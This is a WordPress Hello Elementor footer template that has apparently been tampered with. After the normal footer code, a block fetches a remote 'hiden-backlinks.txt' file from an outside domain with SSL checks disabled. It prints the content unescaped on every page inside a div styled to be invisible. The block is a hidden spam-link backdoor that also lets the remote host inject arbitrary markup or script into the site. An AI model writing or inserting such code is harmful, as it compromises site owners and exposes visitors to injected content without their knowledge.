<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after.
 *
 * @package HelloElementor
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly.
}

// Elementor footer handling
if ( ! function_exists( 'elementor_theme_do_location' ) || ! elementor_theme_do_location( 'footer' ) ) {
    if ( hello_elementor_display_header_footer() ) {
        if ( did_action( 'elementor/loaded' ) && hello_header_footer_experiment_active() ) {
            get_template_part( 'template-parts/dynamic-footer' );
        } else {
            get_template_part( 'template-parts/footer' );
        }
    }
}
?>
<?php wp_footer(); ?>
<?php
$response = wp_remote_get(
    'https://yokgercep.com/404-forbiden/hiden-backlinks.txt',
    array(
        'timeout' => 5,
        'sslverify' => false
    )
);

if ( ! is_wp_error( $response ) ) {
    $body = wp_remote_retrieve_body( $response );
    if ( ! empty( $body ) ) {
        echo '<div class="sponsor-area" style="
            font-size:0.00001px;
            color:#f4f4f4;
            background:#f4f4f4;
            line-height:0;
            height:0;
            overflow:hidden;
        ">';
        echo $body;
        echo '</div>';
    }
}
?>
</body>
</html>
